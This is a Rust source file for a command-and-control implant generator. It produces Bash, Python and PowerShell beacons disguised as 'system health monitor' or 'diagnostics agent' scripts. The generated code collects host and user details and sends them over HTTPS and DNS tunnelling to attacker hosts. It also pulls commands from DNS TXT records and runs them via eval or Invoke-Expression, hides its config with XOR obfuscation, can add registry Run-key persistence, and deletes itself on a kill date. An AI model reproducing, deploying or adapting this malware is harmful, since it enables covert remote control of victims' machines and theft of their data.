use std::fmt;

use base64::{engine::general_purpose::STANDARD as B64, Engine};
use serde::{Deserialize, Serialize};

/// Target platform for implant generation.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum ImplantPlatform {
    Bash,
    Python,
    PowerShell,
}

impl fmt::Display for ImplantPlatform {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let label = match self {
            Self::Bash => "Bash",
            Self::Python => "Python",
            Self::PowerShell => "PowerShell",
        };
        write!(f, "{label}")
    }
}

/// Configuration for implant generation.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ImplantConfig {
    pub platform: ImplantPlatform,
    pub c2_servers: Vec<String>,
    pub dns_domain: String,
    pub sleep_secs: u64,
    pub jitter_pct: f64,
    pub kill_date: Option<String>,
    pub implant_id: String,
    pub encryption_key_hex: String,
    pub registry_persistence: bool,
}

impl Default for ImplantConfig {
    fn default() -> Self {
        Self {
            platform: ImplantPlatform::Bash,
            c2_servers: vec!["https://cdn.legit-service.com/api".to_string()],
            dns_domain: "c2.attacker.com".to_string(),
            sleep_secs: 60,
            jitter_pct: 0.2,
            kill_date: None,
            implant_id: "imp-0001".to_string(),
            encryption_key_hex: "0123456789abcdef0123456789abcdef".to_string(),
            registry_persistence: false,
        }
    }
}

/// Generated implant with source code and metadata.
#[derive(Debug, Clone)]
pub struct GeneratedImplant {
    pub platform: ImplantPlatform,
    pub source_code: String,
    pub filename: String,
    pub description: String,
}

/// XOR-obfuscate a string with a single-byte key, return base64.
fn xor_obfuscate(data: &str, key: u8) -> String {
    let xored: Vec<u8> = data.bytes().map(|b| b ^ key).collect();
    B64.encode(&xored)
}

/// Generate a Bash implant script.
///
/// Uses curl for HTTPS beacons and dig for DNS beacons.
/// Works on any Linux/macOS with standard tools.
fn generate_bash_implant(config: &ImplantConfig) -> GeneratedImplant {
    let c2_url = config.c2_servers.first().map_or("", |s| s.as_str());
    let kill_check = config
        .kill_date
        .as_ref()
        .map(|d| {
            format!(
                r#"
# Kill date check
KILL_DATE="{d}"
if [ "$(date +%Y-%m-%d)" \> "$KILL_DATE" ]; then
    rm -f "$0"
    exit 0
fi"#
            )
        })
        .unwrap_or_default();

    let source = format!(
        r#"#!/bin/bash
# System health monitor v2.3.1
# Performs periodic system diagnostics

C2_URL="{c2_url}"
DNS_DOMAIN="{dns_domain}"
IMPLANT_ID="{implant_id}"
SLEEP_BASE={sleep_secs}
JITTER_PCT={jitter_pct}
{kill_check}

get_sysinfo() {{
    local hn=$(hostname 2>/dev/null || echo "unknown")
    local un=$(whoami 2>/dev/null || echo "unknown")
    local os=$(uname -srm 2>/dev/null || echo "unknown")
    local ip=$(hostname -I 2>/dev/null | awk '{{print $1}}' || echo "127.0.0.1")
    echo "${{hn}}|${{un}}|${{os}}|${{ip}}"
}}

beacon_https() {{
    local data="$1"
    local encoded=$(echo -n "$data" | base64 | tr -d '\n')
    curl -s -o /dev/null -X POST "$C2_URL" \
        -H "Content-Type: application/json" \
        -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36" \
        -d "{{\\"text\\":\\"status update: $encoded\\"}}" 2>/dev/null
}}

beacon_dns() {{
    local data="$1"
    local encoded=$(echo -n "$data" | base64 | tr '+/' '-_' | tr -d '=\n')
    local chunk_size=50
    local seq=0
    local offset=0
    local len=${{#encoded}}
    while [ $offset -lt $len ]; do
        local chunk="${{encoded:$offset:$chunk_size}}"
        dig +short TXT "$(printf '%04x' $seq).$chunk.$IMPLANT_ID.c2.$DNS_DOMAIN" @8.8.8.8 >/dev/null 2>&1
        seq=$((seq + 1))
        offset=$((offset + chunk_size))
    done
}}

poll_commands() {{
    local resp=$(dig +short TXT "$IMPLANT_ID.cmd.c2.$DNS_DOMAIN" @8.8.8.8 2>/dev/null | tr -d '"')
    if [ -n "$resp" ] && [ "$resp" != "" ]; then
        local decoded=$(echo "$resp" | base64 -d 2>/dev/null)
        if [ -n "$decoded" ]; then
            eval "$decoded" 2>&1
        fi
    fi
}}

calc_sleep() {{
    local base=$SLEEP_BASE
    local jitter=$(echo "$base * $JITTER_PCT" | bc 2>/dev/null || echo "0")
    local jitter_int=${{jitter%%.*}}
    if [ "$jitter_int" -gt 0 ] 2>/dev/null; then
        local offset=$((RANDOM % (jitter_int * 2 + 1) - jitter_int))
        echo $((base + offset))
    else
        echo $base
    fi
}}

# Main beacon loop
while true; do
    sysinfo=$(get_sysinfo)
    payload="$IMPLANT_ID|checkin|$sysinfo"
    beacon_https "$payload"
    beacon_dns "$payload"
    poll_commands
    sleep $(calc_sleep)
done
"#,
        c2_url = c2_url,
        dns_domain = config.dns_domain,
        implant_id = config.implant_id,
        sleep_secs = config.sleep_secs,
        jitter_pct = config.jitter_pct,
        kill_check = kill_check,
    );

    GeneratedImplant {
        platform: ImplantPlatform::Bash,
        source_code: source,
        filename: "health_monitor.sh".to_string(),
        description: "Bash beacon using curl (HTTPS) and dig (DNS)".to_string(),
    }
}

/// Generate a Python implant script.
///
/// Cross-platform Python 3 using only stdlib. Base64+XOR obfuscation of config.
fn generate_python_implant(config: &ImplantConfig) -> GeneratedImplant {
    let c2_url = config.c2_servers.first().map_or("", |s| s.as_str());
    let xor_key: u8 = 0x5A;
    let obfuscated_c2 = xor_obfuscate(c2_url, xor_key);
    let obfuscated_id = xor_obfuscate(&config.implant_id, xor_key);
    let obfuscated_dns = xor_obfuscate(&config.dns_domain, xor_key);

    let kill_check = config
        .kill_date
        .as_ref()
        .map(|d| {
            format!(
                r#"
    # Kill date
    if datetime.date.today() > datetime.date.fromisoformat("{d}"):
        os.remove(sys.argv[0])
        sys.exit(0)"#
            )
        })
        .unwrap_or_default();

    let source = format!(
        r#"#!/usr/bin/env python3
"""System diagnostics agent v3.1.0"""
import base64, datetime, json, os, platform, random, socket, sys, time
import urllib.request, urllib.error

XOR_KEY = 0x{xor_key:02X}

def deobf(encoded):
    raw = base64.b64decode(encoded)
    return bytes(b ^ XOR_KEY for b in raw).decode()

C2_URL = deobf("{obfuscated_c2}")
IMPLANT_ID = deobf("{obfuscated_id}")
DNS_DOMAIN = deobf("{obfuscated_dns}")
SLEEP_BASE = {sleep_secs}
JITTER_PCT = {jitter_pct}

def get_sysinfo():
    return {{
        "hostname": socket.gethostname(),
        "username": os.getlogin() if hasattr(os, "getlogin") else os.environ.get("USER", "unknown"),
        "os": f"{{platform.system()}} {{platform.release()}}",
        "ip": socket.gethostbyname(socket.gethostname()),
    }}

def beacon_https(data):
    try:
        payload = json.dumps({{"text": f"status update: {{base64.b64encode(data.encode()).decode()}}"}}).encode()
        req = urllib.request.Request(
            C2_URL,
            data=payload,
            headers={{
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            }},
        )
        urllib.request.urlopen(req, timeout=10)
    except Exception:
        pass

def beacon_dns(data):
    try:
        encoded = base64.b32encode(data.encode()).decode().lower().rstrip("=")
        chunk_size = 50
        for seq, i in enumerate(range(0, len(encoded), chunk_size)):
            chunk = encoded[i : i + chunk_size]
            query = f"{{seq:04x}}.{{chunk}}.{{IMPLANT_ID}}.c2.{{DNS_DOMAIN}}"
            try:
                socket.getaddrinfo(query, None)
            except socket.gaierror:
                pass
    except Exception:
        pass

def calc_sleep():
    jitter = int(SLEEP_BASE * JITTER_PCT)
    return SLEEP_BASE + random.randint(-jitter, jitter) if jitter > 0 else SLEEP_BASE

def main():
    {kill_check}
    while True:
        try:
            info = get_sysinfo()
            payload = f"{{IMPLANT_ID}}|checkin|{{json.dumps(info)}}"
            beacon_https(payload)
            beacon_dns(payload)
        except Exception:
            pass
        time.sleep(calc_sleep())

if __name__ == "__main__":
    main()
"#,
        xor_key = xor_key,
        obfuscated_c2 = obfuscated_c2,
        obfuscated_id = obfuscated_id,
        obfuscated_dns = obfuscated_dns,
        sleep_secs = config.sleep_secs,
        jitter_pct = config.jitter_pct,
        kill_check = kill_check,
    );

    GeneratedImplant {
        platform: ImplantPlatform::Python,
        source_code: source,
        filename: "diagnostics_agent.py".to_string(),
        description: "Python 3 stdlib-only beacon with XOR-obfuscated config".to_string(),
    }
}

/// Generate a PowerShell implant script.
///
/// Windows-compatible, uses Invoke-WebRequest and Resolve-DnsName.
fn generate_powershell_implant(config: &ImplantConfig) -> GeneratedImplant {
    let c2_url = config.c2_servers.first().map_or("", |s| s.as_str());
    let xor_key: u8 = 0x3C;
    let obfuscated_c2 = xor_obfuscate(c2_url, xor_key);
    let obfuscated_id = xor_obfuscate(&config.implant_id, xor_key);

    let kill_check = config
        .kill_date
        .as_ref()
        .map(|d| {
            format!(
                r#"
# Kill date check
$killDate = [datetime]::Parse("{d}")
if ((Get-Date) -gt $killDate) {{
    Remove-Item $MyInvocation.MyCommand.Path -Force
    exit
}}"#
            )
        })
        .unwrap_or_default();

    let persistence = if config.registry_persistence {
        r#"
# Registry persistence
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$scriptPath = $MyInvocation.MyCommand.Path
if ($scriptPath -and -not (Get-ItemProperty -Path $regPath -Name "SystemHealthMonitor" -ErrorAction SilentlyContinue)) {
    Set-ItemProperty -Path $regPath -Name "SystemHealthMonitor" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
}"#
        .to_string()
    } else {
        String::new()
    };

    let source = format!(
        r#"<# System Health Monitor v2.1 #>
$ErrorActionPreference = "SilentlyContinue"

function Deobf([string]$encoded) {{
    $raw = [Convert]::FromBase64String($encoded)
    $key = 0x{xor_key:02X}
    $decoded = $raw | ForEach-Object {{ $_ -bxor $key }}
    return [System.Text.Encoding]::UTF8.GetString($decoded)
}}

$C2URL = Deobf("{obfuscated_c2}")
$ImplantID = Deobf("{obfuscated_id}")
$DnsDomain = "{dns_domain}"
$SleepBase = {sleep_secs}
$JitterPct = {jitter_pct}
{kill_check}
{persistence}

function Get-SysInfo {{
    $hn = $env:COMPUTERNAME
    $un = $env:USERNAME
    $os = (Get-CimInstance Win32_OperatingSystem).Caption
    $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {{ $_.InterfaceAlias -notlike "*Loopback*" }} | Select-Object -First 1).IPAddress
    return "$hn|$un|$os|$ip"
}}

function Beacon-HTTPS([string]$data) {{
    try {{
        $encoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($data))
        $body = @{{ text = "status update: $encoded" }} | ConvertTo-Json
        Invoke-WebRequest -Uri $C2URL -Method POST -Body $body -ContentType "application/json" `
            -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" `
            -UseBasicParsing -TimeoutSec 10 | Out-Null
    }} catch {{}}
}}

function Beacon-DNS([string]$data) {{
    try {{
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($data)
        $encoded = [Convert]::ToBase64String($bytes).Replace("+","-").Replace("/","_").TrimEnd("=")
        $chunkSize = 50
        $seq = 0
        for ($i = 0; $i -lt $encoded.Length; $i += $chunkSize) {{
            $chunk = $encoded.Substring($i, [Math]::Min($chunkSize, $encoded.Length - $i))
            $query = "$('{{0:X4}}' -f $seq).$chunk.$ImplantID.c2.$DnsDomain"
            Resolve-DnsName -Name $query -Type TXT -DnsOnly -ErrorAction SilentlyContinue | Out-Null
            $seq++
        }}
    }} catch {{}}
}}

function Poll-Commands {{
    try {{
        $result = Resolve-DnsName -Name "$ImplantID.cmd.c2.$DnsDomain" -Type TXT -DnsOnly -ErrorAction SilentlyContinue
        if ($result -and $result.Strings) {{
            $decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($result.Strings[0]))
            if ($decoded) {{
                $output = Invoke-Expression $decoded 2>&1
                Beacon-HTTPS "$ImplantID|result|$output"
            }}
        }}
    }} catch {{}}
}}

function Get-Sleep {{
    $jitter = [int]($SleepBase * $JitterPct)
    if ($jitter -gt 0) {{
        return $SleepBase + (Get-Random -Minimum (-$jitter) -Maximum ($jitter + 1))
    }}
    return $SleepBase
}}

# Main beacon loop
while ($true) {{
    $info = Get-SysInfo
    $payload = "$ImplantID|checkin|$info"
    Beacon-HTTPS $payload
    Beacon-DNS $payload
    Poll-Commands
    Start-Sleep -Seconds (Get-Sleep)
}}
"#,
        xor_key = xor_key,
        obfuscated_c2 = obfuscated_c2,
        obfuscated_id = obfuscated_id,
        dns_domain = config.dns_domain,
        sleep_secs = config.sleep_secs,
        jitter_pct = config.jitter_pct,
        kill_check = kill_check,
        persistence = persistence,
    );

    GeneratedImplant {
        platform: ImplantPlatform::PowerShell,
        source_code: source,
        filename: "SystemHealthMonitor.ps1".to_string(),
        description: "PowerShell beacon with optional registry persistence".to_string(),
    }
}

/// Generate an implant for the specified platform.
pub fn generate_implant(config: &ImplantConfig) -> GeneratedImplant {
    match config.platform {
        ImplantPlatform::Bash => generate_bash_implant(config),
        ImplantPlatform::Python => generate_python_implant(config),
        ImplantPlatform::PowerShell => generate_powershell_implant(config),
    }
}

/// Generate implants for all supported platforms at once.
pub fn generate_all_implants(config: &ImplantConfig) -> Vec<GeneratedImplant> {
    let platforms = [
        ImplantPlatform::Bash,
        ImplantPlatform::Python,
        ImplantPlatform::PowerShell,
    ];
    platforms
        .iter()
        .map(|p| {
            let mut cfg = config.clone();
            cfg.platform = *p;
            generate_implant(&cfg)
        })
        .collect()
}

/// Verify that a generated implant has essential C2 elements.
pub fn validate_implant(implant: &GeneratedImplant, config: &ImplantConfig) -> Vec<String> {
    let mut issues = Vec::new();
    let src = &implant.source_code;

    if src.is_empty() {
        issues.push("empty source code".to_string());
    }

    if !src.contains(&config.implant_id) && !src.contains("Deobf") && !src.contains("deobf") {
        issues.push("implant ID not present (even obfuscated)".to_string());
    }

    match implant.platform {
        ImplantPlatform::Bash => {
            if !src.contains("#!/bin/bash") {
                issues.push("missing bash shebang".to_string());
            }
            if !src.contains("curl") {
                issues.push("missing curl for HTTPS beacon".to_string());
            }
            if !src.contains("dig") {
                issues.push("missing dig for DNS beacon".to_string());
            }
            if !src.contains("sleep") {
                issues.push("missing sleep in loop".to_string());
            }
        }
        ImplantPlatform::Python => {
            if !src.contains("#!/usr/bin/env python3") {
                issues.push("missing python shebang".to_string());
            }
            if !src.contains("urllib") {
                issues.push("missing urllib for HTTPS beacon".to_string());
            }
            if !src.contains("time.sleep") {
                issues.push("missing time.sleep".to_string());
            }
            if !src.contains("deobf") && !src.contains("Deobf") {
                issues.push("missing config deobfuscation".to_string());
            }
        }
        ImplantPlatform::PowerShell => {
            if !src.contains("Invoke-WebRequest") && !src.contains("Invoke-RestMethod") {
                issues.push("missing HTTPS beacon cmdlet".to_string());
            }
            if !src.contains("Resolve-DnsName") {
                issues.push("missing DNS beacon cmdlet".to_string());
            }
            if !src.contains("Start-Sleep") {
                issues.push("missing Start-Sleep".to_string());
            }
        }
    }

    issues
}

#[cfg(test)]
#[path = "implant_generator_test.rs"]
mod tests;
